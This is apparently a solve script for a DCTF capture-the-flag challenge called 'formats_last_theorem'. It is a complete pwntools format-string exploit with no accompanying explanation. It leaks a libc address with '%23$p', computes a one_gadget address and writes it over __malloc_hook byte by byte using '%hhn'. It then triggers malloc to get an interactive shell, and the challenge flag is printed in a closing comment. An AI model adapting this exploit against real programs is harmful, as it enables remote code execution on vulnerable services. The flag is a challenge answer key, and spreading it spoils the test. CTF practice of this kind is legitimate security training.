from pwn import *
context.binary = elf = ELF("./formats_last_theorem")
libc = elf.libc

io = remote("dctf-chall-formats-last-theorem.westeurope.azurecontainer.io", 7482)
#io = elf.process()
#gdb.attach(io)

payload = "%23$p"
io.sendline(payload)
io.readuntil("you entered\n")
libc_leak = int(io.readline().strip(),16)-231
print("leak: "+hex(libc_leak))
libc.address = libc_leak - libc.symbols['__libc_start_main']
print("Libc: "+hex(libc.address))
one_gad = libc.address + 0x4f432
print("One gad: "+hex(one_gad))

c=0
for b in p64(one_gad)[:6]:
    print(repr(b))
    num = ord(b)
    p2 = "%{}x%8$hhn".format(num).ljust(16,"a")
    print(p2)
    p2 += p64(libc.symbols['__malloc_hook']+c)
    c += 1
    io.sendline(p2)
io.sendline("%65535u")
io.interactive()

# cat flag.txt
# dctf{N0t_all_7h30r3ms_s0und_g00d}